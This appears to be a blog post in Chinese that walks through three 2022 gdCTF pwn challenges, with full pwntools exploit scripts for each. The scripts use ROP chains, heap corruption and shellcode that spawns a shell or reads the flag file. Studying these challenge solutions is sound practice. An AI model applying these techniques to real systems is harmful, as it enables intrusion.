{"title":"[2022gdCTF]jmp_rsp midpwn easyheap WP","date":"2022-05-23T00:51:26.000Z","toc":true,"source":"_posts/2022gdCTF-pwn.md","raw":"---\ntitle: \"[2022gdCTF]jmp_rsp midpwn easyheap WP\"\ncomments: true\ntoc: true\ndate: 2022-05-23 08:51:26\ntags:\n  - CTF\n  - Pwn\n  - GDCTF\n---\n\n# jmp_rsp\n\n## 题目\n\nhttps://gitee.com/csomebro/ctftask/blob/master/2022-05_gdCTF/jmp_rsp.zip\n\n## 解题思路\n\n直接一把梭，写入ROP，在bss上写shellcode即可\n\n## EXP\n\n```python\nfrom pwn import *\nimport time\n\ncontext.log_level='debug'\n\n# io = process('./jmp_rsp')\nio = remote('47.106.122.102', 44071)\n\nelf = ELF('./jmp_rsp')\n\ncontext.clear(arch='x86_64')\nshell_code = asm(shellcraft.sh())\n\npop_rdi = 0x0000000000400696\npop_rsi = 0x0000000000410173\npop_rdx = 0x0000000000449395\nvuln_buf = 0x00000006B9144\n# gdb.attach(io)\n\np = 'a' * 0x88 + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(vuln_buf) + p64(pop_rdx) + p64(0x50) + p64(elf.sym['read']) + p64(vuln_buf)\nio.sendline(p)\ntime.sleep(2)\nio.sendline(shell_code)\n\nio.interactive()\n```\n\n# midpwn\n\n## 题目\n\nhttps://gitee.com/csomebro/ctftask/blob/master/2022-05_gdCTF/midpwn.zip\n\n## 解题思路\n\n逆向分析发现，开了沙箱，需要利用orw进行文件内容泄露\n\n![image-20220523085903003](2022gdCTF-pwn/image-20220523085903003.png)\n\n通过逆向分析发现edit函数存在off by one的漏洞\n\n![image-20220523090433714](2022gdCTF-pwn/image-20220523090433714.png)\n\n最后的思路就是，通过off by one修改下一个堆块的size位置，构造堆块堆叠，接下来主要控制tacache bin的fd指针构造任意位置分配读写。\n\n能够实现任意位置读写之后，构造堆块进入unsortedbin，泄露main_arena的地址，从而泄露libc_base，通过偏移量算出environ的地址（libc地址中存放着environ变量，中存放着栈地址），再次构造堆块，分配到environ上面，泄露栈地址，最后，malloc执行的位置是在add函数，通过计算偏移修改add函数返回地址，写入ROP。\n\n有关ROP的构造，实验发现mmap只需要前4个参数为addr、size、7、34即可分配出一个可执行的目标地址。\n\n故构造ROP，分配一个0x23330000的地址作为写入shellcode的地址，最后调用`read(0,0x23330000,0x50)`写入orw\n\n```python\ndef func(a, b, c, d):\n    pp = p64(pop_rdi) + p64(a)\n    pp += p64(pop_rsi) + p64(b)\n    pp += p64(pop_rdx_rcx_rbx) + p64(c) + p64(d) + p64(0)\n    return pp\np = func(0x23330000, 0x1000, 7, 34) + p64(libc.sym['mmap'])\np += func(0, 0x23330000, 0x50, 0) + p64(libc.sym['read']) \np += p64(0x23330000)\n```\n\n有关ORW的构造\n\n```python\ncontext(arch='amd64')\nsc = asm(shellcraft.open('./flag'))\nsc += asm(shellcraft.read(6, 0x23330000 + 0x300, 0x30))\nsc += asm(shellcraft.write(1, 0x23330000 + 0x300, 0x30))\n```\n\n## 完整EXP\n\n```python\nfrom pwn import *\nimport time\n\ncontext.log_level='debug'\n# getIO = lambda : process(['./ld-2.31.so', './orz'], env={'LD_PRELOAD': './libc-2.31.so'})\ngetIO = lambda : remote('120.79.220.233', 45715)\nsc = ''\nio = getIO()\n\ndef add(size, content): \n    io.sendlineafter('Your choose which one?\\n', '1') \n    io.sendlineafter('please input note size : ', str(size)) \n    io.sendlineafter('please input your note.\\n', content) \ndef add2(size, content): \n    io.sendlineafter('Your choose which one?\\n', '1') \n    io.sendlineafter('please input note size : ', str(size)) \n    io.sendafter('please input your note.\\n', content) \n\ndef edit(idx, content): \n    io.sendlineafter('Your choose which one?\\n', '2') \n    io.sendlineafter('please input note index.\\n', str(idx)) \n    io.sendlineafter('please input new note.\\n', content) \n\ndef show(idx): \n    io.sendlineafter('Your choose which one?\\n', '3') \n    io.sendlineafter('please input note index.\\n', str(idx)) \ndef delete(idx): \n    io.sendlineafter('Your choose which one?\\n', '4') \n    io.sendlineafter('please input note index.\\n', str(idx))\n\n# gdb.attach(io)\nstack_offset = 0x120\nadd(0x28, 'aaaa') # 0\nfor i in range(10):\n    add(0xb0, 'aaaaaa') # 1 ~ 10\nfor i in range(10):\n    delete(i)\nfor i in range(7):\n    add(0xb0, 'aaaaa')\nadd2(0xb0, 'a')\nshow(7)\nlibc_base = u64(io.recv(8)) - (0x7f3a3e885d61 - 0x7f3a3e699000 )\nlog.success('libc_base:'+hex(libc_base))\n\nenviron = 0x01EF600 + libc_base \nlog.success('environ:'+hex(environ))\n\nadd(0x28, 'aaaa') # 8\nadd(0xb0, 'aaaa') # 9\n\nadd(0x28, 'aaaa') # 11 vuln\nadd(0x28, 'aaaa') # 12 edit\nadd(0x28, 'aaaa') # 13\nadd(0x28, 'aaaa') # 14\nadd(0x28, 'aaaa') # 15\nadd(0x28, 'aaaa') # 16\n\nedit(11,'a' *0x28+'\\xc1')\ndelete(12)\nadd(0xb0, 'aaaaa')\nadd(0x28, 'aaaa') # 17\ndelete(17)\ndelete(13)\n\nedit(12, 'a'*0x28+p64(0x31)+p64(environ-0x10))\n\nadd(0x28, 'aaaa') # 13\nadd2(0x28, 'a'*0x10) # 17\n\nshow(17)\nio.recv(16)\nstack_base = u64(io.recv(8)) # - 0x1f438 \n\nlog.success('stack_base:'+hex(stack_base))\n\npop_rdi = 0x0000000000023b72 + libc_base\npop_rsi = libc_base + 0x000000000002604f\npop_rdx_rcx_rbx = libc_base + 0x00000000001025ad\ndef func(a, b, c, d):\n    pp = p64(pop_rdi) + p64(a)\n    pp += p64(pop_rsi) + p64(b)\n    pp += p64(pop_rdx_rcx_rbx) + p64(c) + p64(d) + p64(0)\n    return pp\n\nlibc = ELF('./libc-2.31.so')\nlibc.address = libc_base\nflag_path = '/home/pwn/flag\\x00'\n\nflag_path_addr = stack_base + 0x150\nadd(0x28, 'aaaa') # 18\nadd(0x28, 'aaaa') # 19\ndelete(19)\ndelete(18)\ndelete(13)\nedit(12, 'a'*0x28+p64(0x31)+p64(flag_path_addr))\nadd(0x28, 'aaaa') # 13\nadd2(0x28, flag_path) # 18\n\nedit(12, 'a'*0x28+p64(0xc1))\nadd(0xb0, 'aaaaa') # 19\ndelete(19)\ndelete(13)\n\nadd_ret =  stack_base - stack_offset\n\nedit(12, 'a'*0x28+p64(0xc1) + p64(add_ret))\nadd(0xb0, 'aaaa') # 13\n\n\np = func(0x23330000, 0x1000, 7, 34) + p64(libc.sym['mmap'])\np += func(0, 0x23330000, 0x50, 0) + p64(libc.sym['read']) \np += p64(0x23330000)\nlog.success('len:' + hex(len(p)))\n\nadd(0xb0, p)\ncontext(arch='amd64')\nif sc == '':\n    sc = asm(shellcraft.open('./flag'))\n    sc += asm(shellcraft.read(6, 0x23330000 + 0x300, 0x30))\n    sc += asm(shellcraft.write(1, 0x23330000 + 0x300, 0x30))\n\n# gdb.attach(io)\ntime.sleep(0.2)\nio.send(sc)\n\n\nio.interactive() \n```\n\n# easyheap\n\n## 题目\n\nhttps://gitee.com/csomebro/ctftask/blob/master/2022-05_gdCTF/easyheap.zip\n\n## 解题思路\n\n主要漏洞在，v3局部变量可能未初始化，可以提前布置栈帧，达到任意位置写入堆地址\n\n![image-20220524094853062](2022gdCTF-pwn/image-20220524094853062.png)\n\n以及还有一个backdoor函数，可以堆上任意写8字节（虽然只有一次，但利用上边的漏洞可以无限次）\n\n利用house of orange，修改_IO_2_stdout_，泄露libc_base，再次利用泄露environ地址，栈地址，heap基址\n\n之后利用修改tcachebin上的fd指针，参考midpwn的解法，修改add函数的返回地址，写入orw ROP，获得flag\n\n## Exp\n\n```python\nfrom pwn import *\nimport ctypes\nimport time\n\ncontext(arch=\"amd64\")\ncontext.log_level = 'debug'\ngetIO = lambda:process(['./ld-2.31.so', './easyheap'], env={'LD_PRELOAD': './libc-2.31.so'})\nio = getIO()\n\ndef add(size, cont):\n    io.sendlineafter('4.delete\\n', '1')\n    io.sendlineafter('Size?\\n', str(size))\n    io.sendafter('Context:\\n', cont)\n\ndef add2(size, offset, cont):\n    pp = '1\\x00'\n    pp += '\\x00' * (12 - len(pp))\n    pp += p32(ctypes.c_uint32(offset).value)\n    io.sendafter('4.delete\\n', pp)\n    io.sendlineafter('Size?\\n', str(size))\n    io.sendlineafter('Context:\\n', cont)\n\ndef add3(size, offset, cont):\n    pp = '1\\x00'\n    pp += '\\x00' * (12 - len(pp))\n    pp += p32(ctypes.c_uint32(offset).value)\n    io.sendafter('4.delete', pp)\n    io.sendlineafter('Size?', str(size))\n    io.sendafter('Context:', cont)\n\ndef edit(idx, cont):\n    io.sendlineafter('4.delete\\n', '2')\n    io.sendlineafter('Idx?\\n', str(idx))\n    io.sendlineafter('Context:\\n', cont)\n\ndef edit2(idx, cont):\n    io.sendlineafter('4.delete', '2')\n    io.sendlineafter('Idx?', str(idx))\n    io.sendafter('Context:', cont)\n\ndef backdoor(size, offset, cont):\n    io.sendlineafter('4.delete\\n', '666')\n    io.sendlineafter('Size?\\n', str(size))\n    io.sendlineafter('Offset?\\n', str(offset))\n    io.sendafter('Context:\\n', cont)\n\ndef backdoor2(size, offset, cont):\n    io.sendlineafter('4.delete', '666')\n    io.sendlineafter('Size?', str(size))\n    io.sendlineafter('Offset?', str(offset))\n    io.sendafter('Context:', cont)\n\nwhile 1:\n    fake_size = 0x061 + 0x1000*1\n    # add(,'aaaaa')\n    backdoor(0x18, 0x6b8, p64(fake_size))\n    add(0x2000, 'aaaaa')\n    add(0x20, 'a')\n    add(0x20, 'aaa')\n    add(0x20, 'aaa')\n    add(0x20, 'aaa')\n    add(0x20, 'aaa')\n    add(0x20, 'aaa')\n\n    add2(0x10, -10, 'aaa')\n\n    backdoor(0x18, -3080, '\\xb0')\n    # backdoor(0x18, -32, '\\xb0')\n    backdoor(0x18, -3616+6, p32(0x7))\n    stdout_in = 0x16a0\n\n    backdoor(0x18, 800, '\\xa0\\x16')\n\n    # add2(0x18, 0, 'aa')\n    flag = 0xfbad1800\n    # add2(0x18, )\n    add2(0x48, 1, 'aa')\n    try:\n        add2(0x48, 0, p64(flag)+p64(0)*3 + '\\x08')\n        inp = io.recv(8,timeout=0.2)\n        if '1.add' in inp:\n            assert 1 == 2\n        stdin_addr = u64(inp)\n        log.success('stdin_addr:'+hex(stdin_addr))\n        break\n    except:\n        io.close()\n        io = getIO()\n\nlibc_base = stdin_addr - 0x1ee7f0\nlog.success('libc_base:'+hex(libc_base))\n\nmain_arena_96 = 0x1ecbe0 + libc_base\nedit2(0, p64(flag)+p64(0)*3 + p64(main_arena_96))\n\nheap_base = u64(io.recv(8)) -0x23010  \nlog.success('heap_base:'+hex(heap_base))\n\nenviron = 0x228138 + libc_base # 偏移量可能不同\nedit2(0, p64(flag)+p64(0)*3 + p64(environ) + p64(environ+0x10) + p64(environ+0x10))\nlog.success('environ:'+hex(environ))\n\nstack_environ = u64(io.recv(8))\nlog.success('stack_environ:'+hex(stack_environ))\n\nrax_0 = 0x00000000000b1d89 + libc_base # xor rax, rax ; ret\nrax_1 = 0x00000000000cfb50 + libc_base #  mov rax, 1 ; ret\nrax_2 = 0x00000000000cfb60 + libc_base #  mov rax, 2 ; ret\npop_rdi = 0x0000000000023b72 + libc_base # pop rdi ; ret\npop_rsi = 0x000000000002604f + libc_base # pop rsi ; ret\nxchg_eax_edi = 0x00000000000f1b95 + libc_base # xchg eax, edi ; ret\nsyscall = 0x00000630D9 + libc_base # syscall; ret in (funlockfile) \n\n\nvuln_stack_tar = stack_environ - 0x138 + 0x20\nbackdoor2(0x18, -512, p64(vuln_stack_tar))\n\nadd3(0xf0-8, 1, 'aaaaaa')\n# io.sendafter('4.delete', '1')\n# io.sendlineafter('Size?', )\n\nrop_tmp = [\n    pop_rdi, 0xadd,\n    pop_rsi, 0,\n    rax_2, syscall, # open\n    xchg_eax_edi, # eax -> edi fd\n    pop_rsi, 0xadd,\n    rax_0, syscall, # read\n    pop_rdi, 1, \n    rax_1, syscall # write\n]\nrop_tmp[1] = rop_tmp[8] = vuln_stack_tar + len(rop_tmp) * 8\nrop_tmp = flat(rop_tmp) + './flag\\x00'\n\n# gdb.attach(io)\nadd3(0xf0-8, 1, rop_tmp)\n\nio.interactive()\n```\n\n## 其他\n\n赛后的补题，比赛没时间了（菜），本地记得新建./flag文件\n\n![image-20220524095329685](2022gdCTF-pwn/image-20220524095329685.png)\n","slug":"2022gdCTF-pwn","published":true,"updated":"2025-10-28T08:00:40.727Z","_id":"cuidZrA66CisksNPVA4C-6900","comments":true,"layout":"post","photos":[],"html":"<h1 id=\"jmp-rsp\"><a href=\"#jmp-rsp\" class=\"headerlink\" title=\"jmp_rsp\"></a>jmp_rsp</h1><h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><p><a href=\"https://gitee.com/csomebro/ctftask/blob/master/2022-05_gdCTF/jmp_rsp.zip\">https://gitee.com/csomebro/ctftask/blob/master/2022-05_gdCTF/jmp_rsp.zip</a></p>\n<h2 id=\"解题思路\"><a href=\"#解题思路\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h2><p>直接一把梭，写入ROP，在bss上写shellcode即可</p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># io = process(&#x27;./jmp_rsp&#x27;)</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;47.106.122.102&#x27;</span>, <span class=\"number\">44071</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./jmp_rsp&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.clear(arch=<span class=\"string\">&#x27;x86_64&#x27;</span>)</span><br><span class=\"line\">shell_code = asm(shellcraft.sh())</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x0000000000400696</span></span><br><span class=\"line\">pop_rsi = <span class=\"number\">0x0000000000410173</span></span><br><span class=\"line\">pop_rdx = <span class=\"number\">0x0000000000449395</span></span><br><span class=\"line\">vuln_buf = <span class=\"number\">0x00000006B9144</span></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x88</span> + p64(pop_rdi) + p64(<span class=\"number\">0</span>) + p64(pop_rsi) + p64(vuln_buf) + p64(pop_rdx) + p64(<span class=\"number\">0x50</span>) + p64(elf.sym[<span class=\"string\">&#x27;read&#x27;</span>]) + p64(vuln_buf)</span><br><span class=\"line\">io.sendline(p)</span><br><span class=\"line\">time.sleep(<span class=\"number\">2</span>)</span><br><span class=\"line\">io.sendline(shell_code)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"midpwn\"><a href=\"#midpwn\" class=\"headerlink\" title=\"midpwn\"></a>midpwn</h1><h2 id=\"题目-1\"><a href=\"#题目-1\" class=\"headerlink\" title=\"题目\"></a>题目</h2><p><a href=\"https://gitee.com/csomebro/ctftask/blob/master/2022-05_gdCTF/midpwn.zip\">https://gitee.com/csomebro/ctftask/blob/master/2022-05_gdCTF/midpwn.zip</a></p>\n<h2 id=\"解题思路-1\"><a href=\"#解题思路-1\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h2><p>逆向分析发现，开了沙箱，需要利用orw进行文件内容泄露</p>\n<p><img src=\"/p/2022gdCTF-pwn/image-20220523085903003.png\" alt=\"image-20220523085903003\"></p>\n<p>通过逆向分析发现edit函数存在off by one的漏洞</p>\n<p><img src=\"/p/2022gdCTF-pwn/image-20220523090433714.png\" alt=\"image-20220523090433714\"></p>\n<p>最后的思路就是，通过off by one修改下一个堆块的size位置，构造堆块堆叠，接下来主要控制tacache bin的fd指针构造任意位置分配读写。</p>\n<p>能够实现任意位置读写之后，构造堆块进入unsortedbin，泄露main_arena的地址，从而泄露libc_base，通过偏移量算出environ的地址（libc地址中存放着environ变量，中存放着栈地址），再次构造堆块，分配到environ上面，泄露栈地址，最后，malloc执行的位置是在add函数，通过计算偏移修改add函数返回地址，写入ROP。</p>\n<p>有关ROP的构造，实验发现mmap只需要前4个参数为addr、size、7、34即可分配出一个可执行的目标地址。</p>\n<p>故构造ROP，分配一个0x23330000的地址作为写入shellcode的地址，最后调用<code>read(0,0x23330000,0x50)</code>写入orw</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">func</span>(<span class=\"params\">a, b, c, d</span>):</span><br><span class=\"line\">    pp = p64(pop_rdi) + p64(a)</span><br><span class=\"line\">    pp += p64(pop_rsi) + p64(b)</span><br><span class=\"line\">    pp += p64(pop_rdx_rcx_rbx) + p64(c) + p64(d) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> pp</span><br><span class=\"line\">p = func(<span class=\"number\">0x23330000</span>, <span class=\"number\">0x1000</span>, <span class=\"number\">7</span>, <span class=\"number\">34</span>) + p64(libc.sym[<span class=\"string\">&#x27;mmap&#x27;</span>])</span><br><span class=\"line\">p += func(<span class=\"number\">0</span>, <span class=\"number\">0x23330000</span>, <span class=\"number\">0x50</span>, <span class=\"number\">0</span>) + p64(libc.sym[<span class=\"string\">&#x27;read&#x27;</span>]) </span><br><span class=\"line\">p += p64(<span class=\"number\">0x23330000</span>)</span><br></pre></td></tr></table></figure>\n\n<p>有关ORW的构造</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">context(arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">sc = asm(shellcraft.<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./flag&#x27;</span>))</span><br><span class=\"line\">sc += asm(shellcraft.read(<span class=\"number\">6</span>, <span class=\"number\">0x23330000</span> + <span class=\"number\">0x300</span>, <span class=\"number\">0x30</span>))</span><br><span class=\"line\">sc += asm(shellcraft.write(<span class=\"number\">1</span>, <span class=\"number\">0x23330000</span> + <span class=\"number\">0x300</span>, <span class=\"number\">0x30</span>))</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"完整EXP\"><a href=\"#完整EXP\" class=\"headerlink\" title=\"完整EXP\"></a>完整EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># getIO = lambda : process([&#x27;./ld-2.31.so&#x27;, &#x27;./orz&#x27;], env=&#123;&#x27;LD_PRELOAD&#x27;: &#x27;./libc-2.31.so&#x27;&#125;)</span></span><br><span class=\"line\">getIO = <span class=\"keyword\">lambda</span> : remote(<span class=\"string\">&#x27;120.79.220.233&#x27;</span>, <span class=\"number\">45715</span>)</span><br><span class=\"line\">sc = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">io = getIO()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size, content</span>): </span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Your choose which one?\\n&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>) </span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;please input note size : &#x27;</span>, <span class=\"built_in\">str</span>(size)) </span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;please input your note.\\n&#x27;</span>, content) </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add2</span>(<span class=\"params\">size, content</span>): </span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Your choose which one?\\n&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>) </span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;please input note size : &#x27;</span>, <span class=\"built_in\">str</span>(size)) </span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;please input your note.\\n&#x27;</span>, content) </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx, content</span>): </span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Your choose which one?\\n&#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>) </span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;please input note index.\\n&#x27;</span>, <span class=\"built_in\">str</span>(idx)) </span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;please input new note.\\n&#x27;</span>, content) </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>): </span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Your choose which one?\\n&#x27;</span>, <span class=\"string\">&#x27;3&#x27;</span>) </span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;please input note index.\\n&#x27;</span>, <span class=\"built_in\">str</span>(idx)) </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>): </span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;Your choose which one?\\n&#x27;</span>, <span class=\"string\">&#x27;4&#x27;</span>) </span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;please input note index.\\n&#x27;</span>, <span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\">stack_offset = <span class=\"number\">0x120</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):</span><br><span class=\"line\">    add(<span class=\"number\">0xb0</span>, <span class=\"string\">&#x27;aaaaaa&#x27;</span>) <span class=\"comment\"># 1 ~ 10</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):</span><br><span class=\"line\">    delete(i)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    add(<span class=\"number\">0xb0</span>, <span class=\"string\">&#x27;aaaaa&#x27;</span>)</span><br><span class=\"line\">add2(<span class=\"number\">0xb0</span>, <span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\">show(<span class=\"number\">7</span>)</span><br><span class=\"line\">libc_base = u64(io.recv(<span class=\"number\">8</span>)) - (<span class=\"number\">0x7f3a3e885d61</span> - <span class=\"number\">0x7f3a3e699000</span> )</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;libc_base:&#x27;</span>+<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\"></span><br><span class=\"line\">environ = <span class=\"number\">0x01EF600</span> + libc_base </span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;environ:&#x27;</span>+<span class=\"built_in\">hex</span>(environ))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 8</span></span><br><span class=\"line\">add(<span class=\"number\">0xb0</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 9</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 11 vuln</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 12 edit</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 13</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 14</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) <span class=\"comment\"># 15</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>, <span class=\"string\">&#x27;aaaa&#x27;</span>) 